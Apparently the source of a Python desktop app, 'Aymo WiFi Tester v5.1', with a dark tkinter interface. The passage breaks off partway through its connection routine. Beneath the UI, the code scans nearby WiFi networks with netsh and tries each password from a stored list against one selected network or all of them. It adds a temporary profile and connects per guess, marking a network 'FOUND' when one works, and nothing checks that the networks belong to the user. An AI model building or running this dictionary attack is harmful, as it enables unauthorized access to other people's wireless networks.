#!/usr/bin/env python3
"""
Aymo WiFi Tester v5.1 - Dark Orange Edition
Simple, working, modern dark UI with orange accents.
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import subprocess
import threading
import json
import os
import sys
import ctypes
import time
from pathlib import Path
from datetime import datetime

CREATE_NO_WINDOW = 0x08000000 if os.name == 'nt' else 0


# ════════════════════════════════════════════════════════════════════════════
# COLORS - Dark + Orange
# ════════════════════════════════════════════════════════════════════════════

C = {
    "bg":         "#0a0a0a",   # App background (near black)
    "card":       "#141414",   # Card background
    "card_hover": "#1e1e1e",   # Card hover
    "input":      "#0d0d0d",   # Input background
    "border":     "#2a2a2a",   # Subtle border
    "border_focus": "#ff8c00", # Orange focus
    "orange":     "#ff8c00",   # Primary orange
    "orange_hover": "#e07b00",
    "orange_press": "#c66f00",
    "success":    "#00ff88",   # Green
    "danger":     "#ff4444",   # Red
    "warning":    "#ffaa00",   # Amber
    "text":       "#ffffff",   # Primary text
    "text_second": "#b0b0b0",  # Secondary text
    "text_muted": "#666666",   # Muted text
    "font":       "Segoe UI",
    "mono":       "Consolas",
}


# ════════════════════════════════════════════════════════════════════════════
# BUTTON - Simple, centered, animated
# ════════════════════════════════════════════════════════════════════════════

class ModernButton(tk.Canvas):
    def __init__(self, parent, text, command=None, icon="",
                 bg=C["orange"], hover=None, press=None, fg="#ffffff",
                 width=200, height=44, radius=10, font_size=11, **kwargs):
        hover = hover or C["orange_hover"]
        press = press or C["orange_press"]

        super().__init__(
            parent, width=width, height=height,
            highlightthickness=0, bg=parent.cget("bg"), **kwargs
        )
        self.command = command
        self.text = text
        self.icon = icon
        self.bg_color = bg
        self.hover_color = hover
        self.press_color = press
        self.fg_color = fg
        self.radius = radius
        self.width_val = width
        self.height_val = height
        self.font_size = font_size
        self.enabled = True
        self.current_color = bg
        self.target_color = bg

        self.bind("<Enter>", self._enter)
        self.bind("<Leave>", self._leave)
        self.bind("<Button-1>", self._press)
        self.bind("<ButtonRelease-1>", self._release)

        self.draw()
        self._animate()

    def draw(self):
        self.delete("all")
        w = self.winfo_width() or self.width_val
        h = self.winfo_height() or self.height_val
        r = min(self.radius, w // 2, h // 2)
        col = self.current_color if self.enabled else C["text_muted"]

        # Rounded rect
        pts = [
            r, 0, w - r, 0, w, 0, w, r, w, h - r, w, h,
            w - r, h, r, h, 0, h, 0, h - r, 0, r, 0, 0
        ]
        self.create_polygon(pts, smooth=True, fill=col, outline="")

        # Icon + text centered
        disp = f"{self.icon}  {self.text}" if self.icon and self.text else (self.icon or self.text)
        self.create_text(
            w // 2, h // 2, text=disp, fill=self.fg_color if self.enabled else C["text_muted"],
            font=(C["font"], self.font_size, "bold"), anchor=tk.CENTER
        )

    def _enter(self, e):
        if self.enabled:
            self.target_color = self.hover_color
            self.config(cursor="hand2")

    def _leave(self, e):
        if self.enabled:
            self.target_color = self.bg_color
            self.config(cursor="")

    def _press(self, e):
        if self.enabled:
            self.target_color = self.press_color

    def _release(self, e):
        if self.enabled:
            self.target_color = self.hover_color
            if self.command:
                self.command()

    def _animate(self):
        if self.current_color != self.target_color:
            c1 = self._hex(self.current_color)
            c2 = self._hex(self.target_color)
            step = 0.3
            r = int(c1[0] + (c2[0] - c1[0]) * step)
            g = int(c1[1] + (c2[1] - c1[1]) * step)
            b = int(c1[2] + (c2[2] - c1[2]) * step)
            self.current_color = f"#{r:02x}{g:02x}{b:02x}"
            self.draw()
        self.after(16, self._animate)

    def _hex(self, h):
        h = h.lstrip("#")
        return tuple(int(h[i:i+2], 16) for i in (0, 2, 4))

    def set_enabled(self, enabled):
        self.enabled = enabled
        self.target_color = self.bg_color if enabled else C["text_muted"]
        self.current_color = self.target_color
        self.draw()


# ════════════════════════════════════════════════════════════════════════════
# PULSE RING
# ════════════════════════════════════════════════════════════════════════════

class PulseRing(tk.Canvas):
    def __init__(self, parent, color=C["orange"], size=20, **kwargs):
        super().__init__(
            parent, width=size, height=size,
            highlightthickness=0, bg=parent.cget("bg"), **kwargs
        )
        self.color = color
        self.size = size
        self.radius = 0
        self.active = False
        self.animate()

    def start(self):
        self.active = True

    def stop(self):
        self.active = False
        self.delete("all")

    def animate(self):
        self.delete("all")
        if self.active:
            self.radius = (self.radius + 2) % 30
            for i in range(3):
                r = (self.radius + i * 10) % 30
                a = max(0, 1 - r / 30)
                if a > 0:
                    x = self.size // 2
                    y = self.size // 2
                    intensity = int(255 * a * 0.7)
                    rc = int(intensity * (int(self.color[1:3], 16) / 255))
                    gc = int(intensity * (int(self.color[3:5], 16) / 255))
                    bc = int(intensity * (int(self.color[5:7], 16) / 255))
                    col = f"#{rc:02x}{gc:02x}{bc:02x}"
                    self.create_oval(x - r, y - r, x + r, y + r, outline=col, width=2)
        self.after(50, self.animate)


# ════════════════════════════════════════════════════════════════════════════
# MAIN APP
# ════════════════════════════════════════════════════════════════════════════

class AymoWiFiTester:
    def __init__(self, root):
        self.root = root
        self.root.title("Aymo WiFi Tester v5.1")
        self.root.geometry("1100x700")
        self.root.minsize(950, 600)
        self.root.configure(bg=C["bg"])

        self.is_admin = self._check_admin()
        self.db_path = Path.home() / ".aymo_wifi_db_v5.json"

        self.password_db = self._load_db()
        self.scanning = False
        self.testing = False
        self.auto_testing = False
        self.current_network = None
        self.selected_networks = set()
        self.network_items = {}
        self.auto_queue = []
        self.auto_index = 0

        self._build_ui()

        if not self.password_db:
            self.root.after(100, self._load_sample)

        self.root.after(500, self._scan)

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------
    def _check_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def _log(self, msg, level="info"):
        if not hasattr(self, "log_text") or self.log_text is None:
            return
        ts = datetime.now().strftime("%H:%M:%S")
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, f"[{ts}] ", "ts")
        self.log_text.insert(tk.END, f"{msg}\n", level)
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)

    def _toast(self, msg, type_="info", duration=2500):
        colors = {"info": C["orange"], "success": C["success"],
                  "warning": C["warning"], "error": C["danger"]}
        bg = colors.get(type_, C["orange"])

        win = tk.Toplevel(self.root)
        win.overrideredirect(True)
        win.attributes("-topmost", True)
        win.attributes("-alpha", 0.0)

        win.update_idletasks()
        sw = win.winfo_screenwidth()
        sh = win.winfo_screenheight()
        w, h = 280, 55
        x = sw - w - 20
        y = sh - h - 100
        win.geometry(f"{w}x{h}+{x}+{y}")

        card = tk.Frame(win, bg=C["card"], highlightbackground=C["border_focus"],
                       highlightthickness=1)
        card.pack(fill=tk.BOTH, expand=True)

        icons = {"info": "ℹ", "success": "✓", "warning": "⚠", "error": "✕"}
        tk.Label(card, text=icons.get(type_, "ℹ"), font=(C["font"], 13, "bold"),
                fg=bg, bg=C["card"]).pack(side=tk.LEFT, padx=(10, 8), pady=10)
        tk.Label(card, text=msg, font=(C["font"], 10), fg=C["text"],
                bg=C["card"], wraplength=180, justify=tk.LEFT).pack(
                side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10), pady=10)

        alpha = 0.0
        def fade_in(a):
            nonlocal alpha
            alpha = a
            if alpha < 1.0:
                alpha += 0.1
                win.attributes("-alpha", alpha)
                win.after(16, lambda: fade_in(alpha))
        fade_in(0)
        win.after(duration, lambda: self._fade_out(win, 1.0))

    def _fade_out(self, win, alpha):
        if alpha > 0:
            alpha -= 0.1
            win.attributes("-alpha", alpha)
            win.after(16, lambda: self._fade_out(win, alpha))
        else:
            win.destroy()

    # ------------------------------------------------------------------
    # UI
    # ------------------------------------------------------------------
    def _build_ui(self):
        # Sidebar
        sidebar = tk.Frame(self.root, bg=C["card"], width=230)
        sidebar.pack(side=tk.LEFT, fill=tk.Y)
        sidebar.pack_propagate(False)

        # Logo
        logo = tk.Frame(sidebar, bg=C["card"])
        logo.pack(fill=tk.X, pady=(24, 16), padx=16)
        lc = tk.Canvas(logo, width=36, height=36, highlightthickness=0, bg=C["card"])
        lc.pack(side=tk.LEFT, padx=(0, 10))
        self._draw_wifi(lc, C["orange"])
        tk.Label(logo, text="AYMO", font=(C["font"], 15, "bold"),
                fg=C["text"], bg=C["card"]).pack(side=tk.LEFT)

        tk.Label(sidebar, text="WiFi Tester v5.1", font=(C["font"], 8),
                fg=C["text_muted"], bg=C["card"]).pack(
                anchor="w", padx=16, pady=(0, 20))

        tk.Frame(sidebar, bg=C["border"], height=1).pack(
            fill=tk.X, padx=16, pady=(0, 16))

        nav = [
            ("📡", "Scan", "scan"),
            ("🚀", "Auto Test All", "auto"),
            ("📝", "Passwords", "pass"),
            ("📋", "Log", "log"),
            ("⚙️", "Settings", "set"),
        ]
        self.nav_btns = {}
        for icon, label, key in nav:
            b = self._nav_item(sidebar, icon, label, key)
            b.pack(fill=tk.X, padx=6, pady=2)
            self.nav_btns[key] = b

        tk.Frame(sidebar, bg=C["bg"]).pack(fill=tk.BOTH, expand=True)

        # Admin footer
        af = tk.Frame(sidebar, bg=C["card"])
        af.pack(side=tk.BOTTOM, fill=tk.X, padx=16, pady=16)
        col = C["success"] if self.is_admin else C["warning"]
        dot = tk.Canvas(af, width=8, height=8, highlightthickness=0, bg=C["card"])
        dot.pack(side=tk.LEFT, padx=(0, 6))
        dot.create_oval(0, 0, 8, 8, fill=col, outline="")
        tk.Label(af, text="ADMIN" if self.is_admin else "USER",
                font=(C["font"], 9, "bold"), fg=col, bg=C["card"]).pack(side=tk.LEFT)

        # Main content
        content = tk.Frame(self.root, bg=C["bg"])
        content.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        # Header
        header = tk.Frame(content, bg=C["bg"], height=64)
        header.pack(fill=tk.X, padx=20, pady=(16, 0))
        header.pack_propagate(False)
        tk.Label(header, text="Network Scanner",
                font=(C["font"], 18, "bold"), fg=C["text"],
                bg=C["bg"], anchor="w").pack(side=tk.LEFT, anchor="w")

        hr = tk.Frame(header, bg=C["bg"])
        hr.pack(side=tk.RIGHT, anchor="e")
        self.admin_badge = self._pill(hr, "● ADMIN" if self.is_admin else "● USER",
                                     C["success"] if self.is_admin else C["warning"])
        self.admin_badge.pack(side=tk.LEFT, padx=(0, 12))

        # Body
        body = tk.Frame(content, bg=C["bg"])
        body.pack(fill=tk.BOTH, expand=True, padx=20, pady=16)

        # LEFT: Networks
        left = tk.Frame(body, bg=C["card"], highlightbackground=C["border"],
                       highlightthickness=1)
        left.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))

        lh = tk.Frame(left, bg=C["card"])
        lh.pack(fill=tk.X, padx=16, pady=(16, 10))
        tk.Label(lh, text="Available Networks", font=(C["font"], 13, "bold"),
                fg=C["text"], bg=C["card"]).pack(side=tk.LEFT)

        self.scan_btn = ModernButton(
            lh, "SCAN", command=self._scan, icon="🔄",
            bg=C["orange"], width=110, height=34, radius=6, font_size=10
        )
        self.scan_btn.pack(side=tk.RIGHT)

        # Tree
        tc = tk.Frame(left, bg=C["card"])
        tc.pack(fill=tk.BOTH, expand=True, padx=16, pady=(0, 16))

        cols = ("sel", "ssid", "signal", "auth", "status")
        self.tree = ttk.Treeview(tc, columns=cols, show="headings", height=13)
        self.tree.heading("sel", text="✓")
        self.tree.heading("ssid", text="Network Name")
        self.tree.heading("signal", text="Signal")
        self.tree.heading("auth", text="Security")
        self.tree.heading("status", text="Status")
        self.tree.column("sel", width=36, minwidth=36, anchor="center")
        self.tree.column("ssid", width=190, minwidth=140)
        self.tree.column("signal", width=90, minwidth=70, anchor="center")
        self.tree.column("auth", width=100, minwidth=80, anchor="center")
        self.tree.column("status", width=100, minwidth=80, anchor="center")

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", background=C["input"], foreground=C["text"],
                       fieldbackground=C["input"], borderwidth=0,
                       font=(C["font"], 9), rowheight=32)
        style.configure("Treeview.Heading", background=C["card"],
                       foreground=C["text_second"], borderwidth=0,
                       font=(C["font"], 9, "bold"))
        style.map("Treeview", background=[("selected", C["orange"])],
                 foreground=[("selected", "#ffffff")])
        self.tree.configure(style="Treeview")

        vsb = ttk.Scrollbar(tc, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=vsb.set)
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)

        self.tree.bind("<<TreeviewSelect>>", self._on_select)
        self.tree.bind("<Button-1>", self._on_tree_click)

        # Action buttons centered
        ab = tk.Frame(left, bg=C["card"])
        ab.pack(fill=tk.X, padx=16, pady=(0, 16))

        self.test_btn = ModernButton(
            ab, "Test Selected", command=self._test_single,
            icon="🔓", bg=C["success"], width=130, height=38, radius=7, font_size=10
        )
        self.test_btn.pack(side=tk.LEFT, padx=(0, 8))

        self.auto_btn = ModernButton(
            ab, "Test All Networks", command=self._test_auto,
            icon="🚀", bg=C["orange"], width=150, height=38, radius=7, font_size=10
        )
        self.auto_btn.pack(side=tk.LEFT, padx=(0, 8))

        self.stop_btn = ModernButton(
            ab, "Stop", command=self._stop,
            icon="⏹", bg=C["danger"], width=80, height=38, radius=7, font_size=10
        )
        self.stop_btn.pack(side=tk.LEFT)

        # RIGHT: Passwords + Log
        right = tk.Frame(body, bg=C["bg"])
        right.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        # Password card
        pc = tk.Frame(right, bg=C["card"], highlightbackground=C["border"],
                     highlightthickness=1)
        pc.pack(fill=tk.BOTH, expand=True, pady=(0, 10))

        pch = tk.Frame(pc, bg=C["card"])
        pch.pack(fill=tk.X, padx=16, pady=(16, 10))
        tk.Label(pch, text="Password Database", font=(C["font"], 13, "bold"),
                fg=C["text"], bg=C["card"]).pack(side=tk.LEFT)

        plc = tk.Frame(pc, bg=C["card"])
        plc.pack(fill=tk.BOTH, expand=True, padx=16, pady=(0, 8))

        self.plist = tk.Listbox(
            plc, bg=C["input"], fg=C["text"],
            selectbackground=C["orange"], selectforeground="#ffffff",
            font=(C["mono"], 9), borderwidth=0, highlightthickness=1,
            highlightbackground=C["border"], highlightcolor=C["border_focus"],
            activestyle="none"
        )
        self.plist.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        psb = ttk.Scrollbar(plc, orient="vertical", command=self.plist.yview)
        self.plist.configure(yscrollcommand=psb.set)
        psb.pack(side=tk.RIGHT, fill=tk.Y)

        self._refresh_plist()

        # Password input row
        pi = tk.Frame(pc, bg=C["card"])
        pi.pack(fill=tk.X, padx=16, pady=(0, 16))

        self.new_pass = tk.Entry(
            pi, bg=C["input"], fg=C["text"], insertbackground=C["orange"],
            borderwidth=0, highlightthickness=1,
            highlightbackground=C["border"], highlightcolor=C["border_focus"],
            font=(C["font"], 10)
        )
        self.new_pass.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 8))
        self.new_pass.bind("<Return>", lambda e: self._add_pass())

        ModernButton(
            pi, "Add", command=self._add_pass, icon="➕",
            bg=C["orange"], width=70, height=32, radius=6, font_size=10
        ).pack(side=tk.RIGHT)

        # Remove/Clear row
        pr = tk.Frame(pc, bg=C["card"])
        pr.pack(fill=tk.X, padx=16, pady=(0, 16))

        ModernButton(
            pr, "Remove", command=self._remove_pass, icon="➖",
            bg=C["danger"], width=90, height=32, radius=6, font_size=10
        ).pack(side=tk.LEFT, padx=(0, 8))

        ModernButton(
            pr, "Clear All", command=self._clear_pass, icon="🗑",
            bg=C["danger"], width=100, height=32, radius=6, font_size=10
        ).pack(side=tk.LEFT)

        # Log card
        lc2 = tk.Frame(right, bg=C["card"], highlightbackground=C["border"],
                      highlightthickness=1)
        lc2.pack(fill=tk.BOTH, expand=True)

        lch = tk.Frame(lc2, bg=C["card"])
        lch.pack(fill=tk.X, padx=16, pady=(16, 10))
        tk.Label(lch, text="Activity Log", font=(C["font"], 13, "bold"),
                fg=C["text"], bg=C["card"]).pack(side=tk.LEFT)

        self.log_text = tk.Text(
            lc2, height=10, bg=C["input"], fg=C["text_second"],
            font=(C["mono"], 8), borderwidth=0, highlightthickness=1,
            highlightbackground=C["border"], highlightcolor=C["border_focus"],
            insertbackground=C["orange"], state=tk.DISABLED, wrap=tk.WORD
        )
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=16, pady=(0, 16))

        self.log_text.tag_config("ts", foreground=C["text_muted"])
        self.log_text.tag_config("info", foreground=C["text_second"])
        self.log_text.tag_config("success", foreground=C["success"])
        self.log_text.tag_config("error", foreground=C["danger"])
        self.log_text.tag_config("warning", foreground=C["warning"])

        # Status bar
        sb = tk.Frame(content, bg=C["card"], height=32)
        sb.pack(fill=tk.X, padx=20, pady=(0, 16))
        sb.pack_propagate(False)

        self.status_var = tk.StringVar(value="Ready")
        tk.Label(sb, textvariable=self.status_var, font=(C["font"], 9),
                fg=C["text_second"], bg=C["card"], anchor="w").pack(
                side=tk.LEFT, padx=12, anchor="center")

        self.pulse = PulseRing(sb, C["orange"], size=16)
        self.pulse.pack(side=tk.RIGHT, padx=12)

        self._log("Aymo WiFi Tester v5.1 initialized", "info")
        if not self.is_admin:
            self._log("Standard user - scanning works, testing needs Admin", "warning")
            self._log("Right-click → Run as administrator", "info")

    # ------------------------------------------------------------------
    # Nav item
    # ------------------------------------------------------------------
    def _nav_item(self, parent, icon, label, key):
        f = tk.Frame(parent, bg=C["card"], cursor="hand2")
        ic = tk.Label(f, text=icon, font=(C["font"], 13),
                     fg=C["text_muted"], bg=C["card"])
        ic.pack(side=tk.LEFT, padx=(16, 10))
        lb = tk.Label(f, text=label, font=(C["font"], 10, "bold"),
                     fg=C["text_muted"], bg=C["card"], anchor="w")
        lb.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 16))

        def ent(e):
            if key != self._nav_active:
                f.configure(bg=C["card_hover"])
                ic.configure(bg=C["card_hover"])
                lb.configure(bg=C["card_hover"], fg=C["text"])

        def lev(e):
            if key != self._nav_active:
                f.configure(bg=C["card"])
                ic.configure(bg=C["card"])
                lb.configure(bg=C["card"], fg=C["text_muted"])

        def cl(e):
            self._nav_active = key
            for k, bf in self.nav_btns.items():
                act = k == key
                bgc = C["card_hover"] if act else C["card"]
                fgc = C["text"] if act else C["text_muted"]
                bf.configure(bg=bgc)
                for ch in bf.winfo_children():
                    ch.configure(bg=bgc, fg=fgc)

        f.bind("<Enter>", ent); f.bind("<Leave>", lev); f.bind("<Button-1>", cl)
        ic.bind("<Enter>", ent); ic.bind("<Leave>", lev); ic.bind("<Button-1>", cl)
        lb.bind("<Enter>", ent); lb.bind("<Leave>", lev); lb.bind("<Button-1>", cl)
        return f

    _nav_active = "scan"

    def _pill(self, parent, text, color):
        p = tk.Canvas(parent, width=100, height=24, highlightthickness=0, bg=C["bg"])
        p.text = text; p.color = color

        def draw():
            p.delete("all")
            w = p.winfo_width() or 100
            h = p.winfo_height() or 24
            r = h // 2
            p.create_oval(0, 0, h, h, fill=color, outline="")
            p.create_oval(w - h, 0, w, h, fill=color, outline="")
            p.create_rectangle(r, 0, w - r, h, fill=color, outline="")
            p.create_text(w // 2, h // 2, text=text, fill="#ffffff",
                         font=(C["font"], 8, "bold"), anchor=tk.CENTER)

        p.bind("<Configure>", lambda e: draw())
        draw()
        return p

    def _draw_wifi(self, canvas, color):
        canvas.delete("all")
        cx, cy = 18, 18
        for i, r in enumerate([6, 11, 16]):
            y = cy + (i - 1) * 3
            canvas.create_arc(cx - r, y - r, cx + r, y + r,
                             start=220, extent=100, outline=color, width=2, style=tk.ARC)
        canvas.create_oval(cx - 2, cy + 1.5, cx + 2, cy + 4.5, fill=color, outline="")

    # ------------------------------------------------------------------
    # Password DB
    # ------------------------------------------------------------------
    def _load_db(self):
        if self.db_path.exists():
            try:
                with open(self.db_path, "r") as f:
                    return json.load(f)
            except:
                pass
        return []

    def _save_db(self):
        try:
            with open(self.db_path, "w") as f:
                json.dump(self.password_db, f, indent=2)
        except Exception as e:
            self._log(f"DB save error: {e}", "error")

    def _refresh_plist(self):
        if not self.plist:
            return
        self.plist.delete(0, tk.END)
        for p in self.password_db:
            self.plist.insert(tk.END, p)

    def _add_pass(self):
        p = self.new_pass.get().strip()
        if p and p not in self.password_db:
            self.password_db.append(p)
            self._save_db()
            self._refresh_plist()
            self.new_pass.delete(0, tk.END)
            self._log(f"Added password ({len(self.password_db)} total)", "success")
        elif p in self.password_db:
            self._log("Password already exists", "warning")

    def _remove_pass(self):
        sel = self.plist.curselection()
        if sel:
            idx = sel[0]
            p = self.plist.get(idx)
            self.password_db.remove(p)
            self._save_db()
            self._refresh_plist()
            self._log("Removed password", "info")

    def _clear_pass(self):
        if self.password_db and messagebox.askyesno("Confirm", "Clear all passwords?"):
            self.password_db.clear()
            self._save_db()
            self._refresh_plist()
            self._log("Cleared all passwords", "warning")

    def _load_sample(self):
        sp = Path(__file__).parent / "sample_passwords.json"
        if sp.exists():
            try:
                with open(sp, "r") as f:
                    self.password_db = json.load(f)
                self._save_db()
                self._refresh_plist()
                self._log(f"Loaded {len(self.password_db)} sample passwords", "success")
            except Exception as e:
                self._log(f"Sample load error: {e}", "error")

    # ------------------------------------------------------------------
    # Netsh
    # ------------------------------------------------------------------
    def _netsh(self, args):
        try:
            r = subprocess.run(["netsh", "wlan"] + args, capture_output=True,
                              timeout=20, creationflags=CREATE_NO_WINDOW)
            out = err = ""
            if r.stdout:
                for enc in ("utf-8", "cp850", "cp437", "cp1252", "latin-1"):
                    try:
                        out = r.stdout.decode(enc); break
                    except: continue
                else:
                    out = r.stdout.decode("utf-8", errors="replace")
            if r.stderr:
                for enc in ("utf-8", "cp850", "cp437", "cp1252", "latin-1"):
                    try:
                        err = r.stderr.decode(enc); break
                    except: continue
                else:
                    err = r.stderr.decode("utf-8", errors="replace")
            return r.returncode == 0, out, err
        except subprocess.TimeoutExpired:
            return False, "", "Timeout"
        except Exception as e:
            return False, "", str(e)

    # ------------------------------------------------------------------
    # Scan
    # ------------------------------------------------------------------
    def _scan(self):
        if self.scanning:
            return
        self.scanning = True
        self.scan_btn.set_enabled(False)
        self.pulse.start()
        self.status_var.set("Scanning...")
        self._log("Scanning networks...", "info")

        def run():
            ok, out, err = self._netsh(["show", "networks"])
            if not ok or not out.strip():
                self.root.after(0, lambda: self._log("Trying detailed scan...", "info"))
                ok2, out2, err2 = self._netsh(["show", "networks", "mode=bssid"])
                if ok2 and out2.strip():
                    ok, out, err = ok2, out2, err2
            if not ok or not out.strip():
                if not self.is_admin:
                    err = (err or "Access denied") + "\nRun as administrator for full access"
                self.root.after(0, lambda: self._result(ok, out, err))
                return
            self.root.after(0, lambda: self._result(ok, out, err))

        threading.Thread(target=run, daemon=True).start()

    def _result(self, ok, out, err):
        self.scanning = False
        self.scan_btn.set_enabled(True)
        self.pulse.stop()
        self.status_var.set("Ready")

        if self.tree:
            self.tree.delete(*self.tree.get_children())
            self.network_items = {}
            self.selected_networks = set()

        if not ok:
            self._log(f"Scan failed: {err}", "error")
            if out.strip():
                self._log(f"Raw: {out[:200]}...", "info")
            return

        if not out.strip():
            self._log("Empty output. Enable WiFi and run as Admin.", "warning")
            self.status_var.set("No networks found")
            return

        nets = self._parse(out)
        if not nets:
            self._log("Could not parse output", "warning")
            self._log(out[:500], "info")
            self.status_var.set("No networks found")
            return

        for n in nets:
            s = n["signal"]
            bar = "██████" if s >= 80 else "████░░" if s >= 60 else "███░░░" if s >= 40 else "██░░░░" if s >= 20 else "█░░░░░"
            item = self.tree.insert("", tk.END, values=(
                "", n["ssid"], f"{bar} {s}%", n["auth"], "Ready"
            ))
            self.network_items[n["ssid"]] = item

        self._log(f"Found {len(nets)} networks", "success")
        self.status_var.set(f"{len(nets)} networks")

    def _parse(self, out):
        nets = []
        cur = {"ssid": None, "auth": None, "sig": 0}
        for line in out.split("\n"):
            line = line.strip()
            if line.startswith("SSID"):
                if cur["ssid"]:
                    nets.append(cur)
                    cur = {"ssid": None, "auth": None, "sig": 0}
                if ":" in line:
                    p = line.split(":", 1)
                    cur["ssid"] = p[1].strip() if len(p) > 1 and p[1].strip() else None
            elif line.startswith("Authentication"):
                if ":" in line:
                    cur["auth"] = line.split(":", 1)[1].strip()
            elif line.startswith("Signal"):
                if ":" in line:
                    try:
                        cur["sig"] = int(line.split(":", 1)[1].strip().replace("%", ""))
                    except:
                        cur["sig"] = 0
        if cur["ssid"]:
            nets.append(cur)
        nets.sort(key=lambda x: x["sig"], reverse=True)
        return nets

    def _on_tree_click(self, e):
        region = self.tree.identify_region(e.x, e.y)
        if region == "cell":
            col = self.tree.identify_column(e.x)
            if col == "#1":
                item = self.tree.identify_row(e.y)
                if item:
                    vals = self.tree.item(item)["values"]
                    if vals:
                        ssid = vals[1]
                        tags = self.tree.item(item).get("tags", ())
                        if "sel" in tags:
                            self.selected_networks.discard(ssid)
                            self.tree.item(item, tags=())
                        else:
                            self.selected_networks.add(ssid)
                            self.tree.item(item, tags=("sel",))
                        self.status_var.set(f"{len(self.selected_networks)} selected")

    def _on_select(self, e):
        sel = self.tree.selection()
        if sel:
            vals = self.tree.item(sel[0])["values"]
            if vals:
                self.current_network = vals[1]
                self.status_var.set(f"Selected: {self.current_network}")

    # ------------------------------------------------------------------
    # Test single
    # ------------------------------------------------------------------
    def _test_single(self):
        if self.testing or self.auto_testing:
            return
        target = self.current_network or (next(iter(self.selected_networks)) if self.selected_networks else None)
        if not target:
            self._toast("Select a network", "warning")
            return
        if not self.password_db:
            self._toast("Add passwords first", "warning")
            return
        if not self.is_admin:
            if not messagebox.askyesno("Admin", "Testing needs Admin. Continue?"):
                return

        self.testing = True
        self.test_btn.set_enabled(False)
        self.auto_btn.set_enabled(False)
        self.stop_btn.set_enabled(True)
        self.scan_btn.set_enabled(False)
        self.status_var.set(f"Testing {target}...")
        self._log(f"Testing: {target}", "info")

        def run():
            self._test_pw(target)
        threading.Thread(target=run, daemon=True).start()

    # ------------------------------------------------------------------
    # Test all
    # ------------------------------------------------------------------
    def _test_auto(self):
        if self.testing or self.auto_testing:
            return
        nets = list(self.selected_networks) if self.selected_networks else \
            [self.tree.item(i)["values"][1] for i in self.tree.get_children()]
        if not nets:
            self._toast("No networks", "warning")
            return
        if not self.password_db:
            self._toast("Add passwords first", "warning")
            return
        if not self.is_admin:
            if not messagebox.askyesno("Admin", "Testing needs Admin. Continue?"):
                return

        self.auto_testing = True
        self.auto_queue = nets[:]
        self.auto_index = 0

        self.test_btn.set_enabled(False)
        self.auto_btn.set_enabled(False)
        self.stop_btn.set_enabled(True)
        self.scan_btn.set_enabled(False)
        self.pulse.start()

        self._log(f"Auto-testing {len(nets)} network(s)...", "info")
        self._toast(f"Auto-testing {len(nets)} networks", "info")
        self._auto_next()

    def _auto_next(self):
        if not self.auto_testing or self.auto_index >= len(self.auto_queue):
            self.auto_testing = False
            self.test_btn.set_enabled(True)
            self.auto_btn.set_enabled(True)
            self.stop_btn.set_enabled(False)
            self.scan_btn.set_enabled(True)
            self.pulse.stop()
            self.status_var.set("Auto-test complete")
            self._log("Auto-test complete", "info")
            self._toast("Auto-test complete", "success")
            return

        ssid = self.auto_queue[self.auto_index]
        self.auto_index += 1
        self.current_network = ssid
        self.status_var.set(f"[{self.auto_index}/{len(self.auto_queue)}] {ssid}")
        self._log(f"[{self.auto_index}/{len(self.auto_queue)}] Testing {ssid}", "info")

        if ssid in self.network_items:
            item = self.network_items[ssid]
            v = self.tree.item(item)["values"]
            self.tree.item(item, values=(v[0], v[1], v[2], v[3], "Testing..."))

        def run():
            self._test_pw(ssid, auto=True)
        threading.Thread(target=run, daemon=True).start()

    def _stop(self):
        self.testing = False
        self.auto_testing = False
        self.auto_queue = []
        self.auto_index = 0
        self.test_btn.set_enabled(True)
        self.auto_btn.set_enabled(True)
        self.stop_btn.set_enabled(False)
        self.scan_btn.set_enabled(True)
        self.pulse.stop()
        self.status_var.set("Stopped")
        self._log("Stopped by user", "warning")

    def _test_pw(self, ssid, auto=False):
        import tempfile
        for idx, p in enumerate(self.password_db):
            if not self.testing and not self.auto_testing:
                break
            self.root.after(0, lambda pw=p, i=idx:
                           self._status(pw, i, ssid))
            if self._connect(ssid, p):
                self.root.after(0, lambda pw=p: self._found(ssid, pw, auto))
                return
        if auto:
            self.root.after(0, lambda: self._auto_done(ssid, False))
        else:
            self.root.after(0, lambda: self._complete(ssid))

    def _auto_done(self, ssid, found):
        if ssid in self.network_items:
            item = self.network_items[ssid]
            v = self.tree.item(item)["values"]
            self.tree.item(item, values=(v[0], v[1], v[2], v[3],
                                        "✅ FOUND" if found else "❌ Failed"))
        self.root.after(600, self._auto_next)

    def _connect(self, ssid, password):
        try:
            import tempfile, os
            xml = self._xml(ssid, password)
            with tempfile.NamedTemporaryFile(mode="w", suffix=".xml",
                                            delete=False, encoding="utf-8") as f:
                f.write(xml)
                xp = f.name
            try:
                r1 = subprocess.run(["netsh", "wlan", "add", "profile",
                                    f"filename={xp}"], capture_output=True,
                                    text=True, timeout=5, creationflags=CREATE_NO_WINDOW)
                if r1.returncode != 0:
                    return False
                r2 = subprocess.run(["netsh", "wlan", "connect", f"name={ssid}"],
                                   capture_output=True, text=True, timeout=8,
                                   creationflags=CREATE_NO_WINDOW)
                if r2.returncode != 0:
                    subprocess.run(["netsh", "wlan", "delete", "profile",
                                   f"name={ssid}"], capture_output=True,
                                   timeout=3, creationflags=CREATE_NO_WINDOW)
                    return False
                time.sleep(1)
                r3 = subprocess.run(["netsh", "wlan", "show", "interfaces"],
                                   capture_output=True, text=True, timeout=3,
                                   creationflags=CREATE_NO_WINDOW)
                connected = False
                if r3.returncode == 0:
                    cssid = st = None
                    for line in r3.stdout.split("\n"):
                        line = line.strip()
                        if line.startswith("SSID") and ":" in line:
                            cssid = line.split(":", 1)[1].strip()
                        elif line.startswith("State") and ":" in line:
